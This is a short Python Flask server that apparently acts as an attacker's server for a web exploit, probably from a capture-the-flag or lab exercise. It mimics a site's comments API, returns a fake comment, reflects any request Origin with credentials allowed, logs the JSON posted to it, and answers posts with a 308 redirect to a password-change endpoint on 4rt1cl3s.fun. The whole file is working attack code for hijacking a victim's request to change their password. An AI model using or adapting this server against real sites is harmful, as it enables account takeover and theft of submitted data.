from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

fake_comment = {"id":100,"articleId":6,"authorId":1,"authorNickname":"h4ck31)","authorProfileImageName":"default.png","postDateTime":"2024-01-09T21:46:25.1582034","content":"Non existing comment"}

@app.route('/Social/CommentsJs/GetComments', methods=['GET'])
def handle_get():
    origin = request.headers.get('Origin')
    response = make_response(jsonify(fake_comment), 200)
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

@app.route('/Social/CommentsJs/PostComment', methods=['OPTIONS'])
def handle_options():
    origin = request.headers.get('Origin')
    print(origin)
    response = make_response("Good to go!",200)
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/Social/CommentsJs/PostComment', methods=['POST'])
def handle_post():
    origin = request.headers.get('Origin')
    data = request.json
    print(data)
    response = make_response("Hacked!", 308)
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    response.headers['Location'] = 'https://4rt1cl3s.fun/RedirectTest/ProfileAPI/ChangePassword'
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
